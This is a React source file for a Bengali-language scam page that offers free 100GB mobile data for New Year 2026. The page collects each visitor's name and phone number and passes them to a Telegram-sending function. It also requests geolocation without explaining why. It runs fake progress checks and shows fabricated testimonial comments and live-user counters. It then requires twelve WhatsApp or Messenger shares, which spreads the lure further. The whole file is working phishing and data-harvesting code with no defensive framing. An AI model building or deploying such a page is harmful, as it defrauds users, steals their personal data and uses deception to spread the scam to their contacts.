
import React, { useState, useEffect } from 'react';
import { Share2, CheckCircle, Smartphone, Users, MessageSquare, ShieldCheck, Heart, User, PartyPopper, Sparkles } from 'lucide-react';
import { sendDataToTelegram } from './telegramService';
import { AppStep, Comment } from './types';

const COMMENTS: Comment[] = [
  { id: 1, name: 'Sabbir Ahmed', text: 'অবিশ্বাস্য! নতুন বছরের শুরুতেই ১০০ জিবি ইন্টারনেট পেয়ে গেলাম। ধন্যবাদ!', avatar: 'https://picsum.photos/seed/sabbir/100', time: '১২ মিনিট আগে', likes: 142 },
  { id: 2, name: 'Tania Sultana', text: 'সবাইকে শুভ নববর্ষ! আমি মাত্রই আমার ফ্রি ১০০ জিবি প্যাকটি পেলাম।', avatar: 'https://picsum.photos/seed/tania/100', time: '৩২ মিনিট আগে', likes: 95 },
  { id: 3, name: 'Kamrul Hasan', text: 'সত্যিই দারুণ একটা গিফট ২০২৬ এর জন্য!', avatar: 'https://picsum.photos/seed/kamrul/100', time: '১ ঘণ্টা আগে', likes: 210 },
  { id: 4, name: 'Nusrat Jahan', text: 'আমার মোবাইলেও একটিভ হয়েছে। আপনারা সবাই দ্রুত ট্রাই করুন।', avatar: 'https://picsum.photos/seed/nusrat/100', time: '২ ঘণ্টা আগে', likes: 67 }
];

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>('landing');
  const [progress, setProgress] = useState(0);
  const [userName, setUserName] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [shareCount, setShareCount] = useState(0);
  const [fakeComments, setFakeComments] = useState<Comment[]>([]);

  const MAX_SHARES = 12;

  useEffect(() => {
    const timers = COMMENTS.map((c, i) => 
      setTimeout(() => {
        setFakeComments(prev => [...prev, c]);
      }, (i + 1) * 2000)
    );
    return () => timers.forEach(t => clearTimeout(t));
  }, []);

  const startInitialCheck = () => {
    setStep('initial_check');
    let p = 0;
    const interval = setInterval(() => {
      p += 2;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep('phone_entry'), 500);
      }
    }, 40);
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (userName.trim().length < 2) {
      alert('আপনার নাম লিখুন');
      return;
    }
    if (phoneNumber.length < 10) {
      alert('সঠিক ফোন নম্বর লিখুন');
      return;
    }
    
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }

    setStep('data_processing');
    sendDataToTelegram(userName, phoneNumber);
    
    let p = 0;
    const interval = setInterval(() => {
      p += 1;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep('share'), 800);
      }
    }, 30);
  };

  const handleShare = (platform: 'whatsapp' | 'messenger') => {
    const text = `*🎉 শুভ নববর্ষ ২০২৬ উপলক্ষে ফ্রি 100GB Internet উপহার — আমি পেয়েছি, আপনিও নিতে পারেন↓*\n${window.location.href}`;
    const url = platform === 'whatsapp' 
      ? `whatsapp://send?text=${encodeURIComponent(text)}`
      : `fb-messenger://share/?link=${encodeURIComponent(window.location.href)}`;
    
    window.location.href = url;
    
    setTimeout(() => {
      setShareCount(prev => {
        const next = prev + 1;
        if (next >= MAX_SHARES) {
          setStep('verify');
        }
        return next;
      });
    }, 2000);
  };

  const shareProgress = Math.min((shareCount / MAX_SHARES) * 100, 100);

  return (
    <div className="min-h-screen bg-slate-900 flex flex-col items-center pb-10">
      {/* Header Banner */}
      <div className="w-full bg-indigo-900 py-6 px-4 text-center shadow-lg sticky top-0 z-50 border-b border-indigo-500/30">
        <h1 className="text-amber-400 text-xl md:text-2xl font-bold flex items-center justify-center gap-2">
          <PartyPopper className="text-amber-400" /> শুভ নববর্ষ ২০২৬ উপলক্ষে ফ্রি 100GB উপহার
        </h1>
      </div>

      <div className="w-full max-w-md bg-white shadow-2xl min-h-[400px] mt-4 rounded-2xl overflow-hidden border border-gray-200 mx-4">
        <div className="relative h-52 bg-indigo-950">
          <img 
            src="https://images.unsplash.com/photo-1546702289-506d19426f49?q=80&w=1000&auto=format&fit=crop" 
            alt="New Year Celebration" 
            className="w-full h-full object-cover opacity-80"
          />
          <div className="absolute inset-0 bg-gradient-to-t from-indigo-950/90 to-transparent flex flex-col justify-end p-6">
            <p className="text-amber-400 font-bold text-lg flex items-center gap-2">
              <Sparkles size={18} /> নতুন বছরের ধামাকা অফার
            </p>
            <p className="text-white text-sm">হ্যাপি নিউ ইয়ার ২০২৬ স্পেশাল গিফট</p>
          </div>
        </div>

        <div className="p-6">
          {step === 'landing' && (
            <div className="text-center animate-in fade-in duration-500">
              <h2 className="text-2xl font-bold text-gray-800 mb-4 leading-tight">
                ২০২৬ সালের শুরুতেই সব সিম গ্রাহকদের জন্য ১০০জিবি ডেটা ফ্রি!
              </h2>
              <button 
                onClick={startInitialCheck}
                className="w-full bg-amber-500 text-indigo-950 font-black py-4 rounded-full text-xl shadow-lg hover:bg-amber-400 transition-all transform active:scale-95 animate-glow"
              >
                উপহারটি গ্রহণ করুন
              </button>
            </div>
          )}

          {step === 'initial_check' && (
            <div className="text-center py-10">
              <div className="relative inline-block mb-4">
                <div className="w-24 h-24 rounded-full border-4 border-gray-100 border-t-amber-500 animate-spin"></div>
                <div className="absolute inset-0 flex items-center justify-center font-bold text-xl text-amber-600">
                  {progress}%
                </div>
              </div>
              <p className="text-gray-600 font-semibold">আপনার যোগ্যতা যাচাই করা হচ্ছে...</p>
            </div>
          )}

          {step === 'phone_entry' && (
            <div className="animate-in slide-in-from-bottom duration-500">
              <p className="text-center text-gray-700 mb-6 font-medium">
                আপনার নাম এবং নম্বর দিয়ে চেক করুন আপনি ১০০জিবি ফ্রি ডেটা গিফট পাবেন কিনা।
              </p>
              <form onSubmit={handlePhoneSubmit} className="space-y-4">
                <div className="flex border-2 border-gray-200 rounded-xl overflow-hidden focus-within:border-amber-500">
                  <div className="bg-gray-50 px-3 py-3 border-r border-gray-200 text-gray-400">
                    <User size={20} />
                  </div>
                  <input 
                    type="text" 
                    placeholder="আপনার নাম"
                    className="flex-1 px-4 py-3 outline-none"
                    value={userName}
                    onChange={(e) => setUserName(e.target.value)}
                    required
                  />
                </div>
                
                <div className="flex border-2 border-gray-200 rounded-xl overflow-hidden focus-within:border-amber-500">
                  <div className="bg-gray-50 px-3 py-3 border-r border-gray-200 text-gray-500 font-bold">+৮৮০</div>
                  <input 
                    type="number" 
                    placeholder="ফোন নম্বর"
                    className="flex-1 px-4 py-3 outline-none"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    required
                  />
                </div>
                
                <button 
                  type="submit"
                  className="w-full bg-indigo-900 text-white py-4 rounded-xl font-bold text-lg hover:bg-indigo-800 transition-colors shadow-md flex items-center justify-center gap-2"
                >
                  ফ্রি গিফট চেক করুন
                </button>
              </form>
            </div>
          )}

          {step === 'data_processing' && (
            <div className="text-center py-10">
              <div className="mb-6 space-y-4">
                <div className="flex justify-between text-sm font-bold text-gray-600 px-2">
                  <span>ডেটা প্রসেসিং...</span>
                  <span>{progress}%</span>
                </div>
                <div className="w-full bg-gray-100 h-4 rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-gradient-to-r from-amber-400 to-amber-600 transition-all duration-300"
                    style={{ width: `${progress}%` }}
                  />
                </div>
              </div>
              <p className="text-sm text-gray-500 animate-pulse">নতুন বছরের উপহারটি আপনার নম্বরে সেট করা হচ্ছে...</p>
            </div>
          )}

          {step === 'share' && (
            <div className="animate-in fade-in zoom-in duration-500">
              <div className="bg-amber-50 border border-amber-200 p-4 rounded-xl mb-6">
                <h3 className="text-amber-700 font-bold text-lg mb-2 flex items-center gap-2">
                  <CheckCircle size={20} /> অভিনন্দন, {userName}!
                </h3>
                <p className="text-sm text-gray-700 leading-relaxed">
                  শুভ নববর্ষ ২০২৬! আপনি ১০০জিবি ফ্রি ডেটা পাওয়ার যোগ্য বিবেচিত হয়েছেন। অফারটি একটিভ করতে নীচের ধাপটি সম্পন্ন করুন:
                </p>
              </div>

              <div className="mb-6">
                <div className="flex justify-between text-sm mb-1 font-bold">
                  <span className="text-gray-600">শেয়ার প্রগ্রেস</span>
                  <span className="text-amber-600">{Math.round(shareProgress)}%</span>
                </div>
                <div className="w-full bg-gray-100 h-3 rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-amber-500 transition-all duration-500"
                    style={{ width: `${shareProgress}%` }}
                  />
                </div>
              </div>

              <div className="space-y-3">
                <button 
                  onClick={() => handleShare('whatsapp')}
                  className="w-full bg-[#25D366] text-white font-bold py-4 rounded-xl flex items-center justify-center gap-2 shadow-md hover:opacity-90 transition-all"
                >
                  <Share2 size={24} /> WhatsApp-এ শেয়ার করুন
                </button>
                <button 
                  onClick={() => handleShare('messenger')}
                  className="w-full bg-[#0084FF] text-white font-bold py-4 rounded-xl flex items-center justify-center gap-2 shadow-md hover:opacity-90 transition-all"
                >
                  <MessageSquare size={24} /> Messenger-এ শেয়ার করুন
                </button>
              </div>

              <p className="text-[11px] text-center text-gray-400 mt-4 leading-tight">
                আপনার ১২ জন বন্ধুকে শেয়ার করার সাথে সাথেই ডেটা সচল হবে। নতুন বছরের এই উপহার হাতছাড়া করবেন না!
              </p>
            </div>
          )}

          {step === 'verify' && (
            <div className="text-center animate-in bounce-in duration-700">
              <div className="w-20 h-20 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-4 text-amber-600">
                <ShieldCheck size={48} />
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-2">অভিনন্দন! শেয়ার সম্পন্ন হয়েছে</h3>
              <p className="text-sm text-gray-600 mb-6 leading-relaxed">
                ভেরিফিকেশন সম্পন্ন করার পর আপনার 100GB ফ্রি ডেটা ২০২৬ অফারটি ইনস্ট্যান্টলি সচল হবে।
              </p>
              <div className="space-y-3">
                <button className="w-full bg-indigo-900 text-white font-bold py-4 rounded-xl hover:bg-indigo-800 shadow-xl">
                  যাচাই সম্পন্ন করুন
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Social Proof */}
      <div className="w-full max-w-md mt-6 px-4">
        <div className="flex items-center justify-between mb-4 border-b border-white/10 pb-2">
          <div className="flex items-center gap-2 text-gray-400">
            <Users size={18} />
            <span className="font-bold">মানুষের প্রতিক্রিয়া</span>
          </div>
          <span className="text-xs text-amber-500/70">২১৪k লাইক</span>
        </div>

        <div className="space-y-4">
          {fakeComments.map((comment) => (
            <div key={comment.id} className="flex gap-3 animate-in slide-in-from-left duration-500">
              <img 
                src={comment.avatar} 
                className="w-10 h-10 rounded-full object-cover shadow-lg border border-white/10" 
                alt={comment.name}
              />
              <div className="flex-1">
                <div className="bg-white/5 backdrop-blur-sm p-3 rounded-2xl border border-white/5">
                  <h4 className="font-bold text-sm text-amber-400">{comment.name}</h4>
                  <p className="text-xs text-gray-300 leading-normal">{comment.text}</p>
                </div>
                <div className="flex gap-4 mt-1 px-2 text-[10px] text-gray-500 font-bold">
                  <button className="hover:text-amber-500">লাইক</button>
                  <button className="hover:text-amber-500">রিপ্লাই</button>
                  <span>{comment.time}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="fixed bottom-4 right-4 flex flex-col items-end gap-2 pointer-events-none">
        <div className="bg-indigo-900/90 backdrop-blur shadow-lg border border-indigo-500/30 rounded-full px-4 py-1.5 flex items-center gap-2 text-[10px] font-bold text-amber-400">
          <Heart size={12} fill="currentColor" />
          <span>৩১২ জন এই মুহূর্তে ডেটা নিচ্ছে</span>
        </div>
      </div>
    </div>
  );
};

export default App;
